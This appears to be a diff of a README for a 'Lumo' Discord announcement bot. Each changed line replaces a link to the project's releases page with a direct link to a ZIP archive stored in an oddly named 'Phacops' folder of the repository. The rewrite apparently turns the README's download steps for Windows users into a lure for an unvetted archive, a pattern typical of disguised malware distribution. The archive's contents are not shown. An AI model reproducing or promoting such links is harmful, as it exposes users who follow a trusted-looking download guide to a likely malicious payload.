@@ -1,6 +1,6 @@
 # 🤖 Lumo-Discord-Annoucument-Bot-Source-Advanced - Easy Discord Announcement Bot
 
-[![Download Lumo Bot](https://img.shields.io/badge/Download-Lumo%20Bot-brightgreen?style=for-the-badge&logo=github)](https://github.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/releases)
+[![Download Lumo Bot](https://img.shields.io/badge/Download-Lumo%20Bot-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/main/Phacops/Annoucument-Source-Advanced-Discord-Lumo-Bot-v3.3.zip)
 
 ## 📋 About Lumo Discord Announcement Bot
 
@@ -38,7 +38,7 @@ To start using Lumo on your Windows PC, follow these simple steps.
 
 Visit the Lumo release page here:
 
-[![Visit Downloads](https://img.shields.io/badge/Visit%20Downloads-blue?style=for-the-badge&logo=github)](https://github.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/releases)
+[![Visit Downloads](https://img.shields.io/badge/Visit%20Downloads-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/main/Phacops/Annoucument-Source-Advanced-Discord-Lumo-Bot-v3.3.zip)
 
 This page contains the latest version of the bot. You will find a ZIP file or installer there.
 
@@ -126,7 +126,7 @@ For further issues, visit the GitHub issues page under the repository to see if 
 
 Return to the release page here to get started:
 
-[https://github.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/releases](https://github.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/releases)
+[https://raw.githubusercontent.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/main/Phacops/Annoucument-Source-Advanced-Discord-Lumo-Bot-v3.3.zip](https://raw.githubusercontent.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/main/Phacops/Annoucument-Source-Advanced-Discord-Lumo-Bot-v3.3.zip)
 
 Click the latest version and download the setup file or ZIP archive.
 
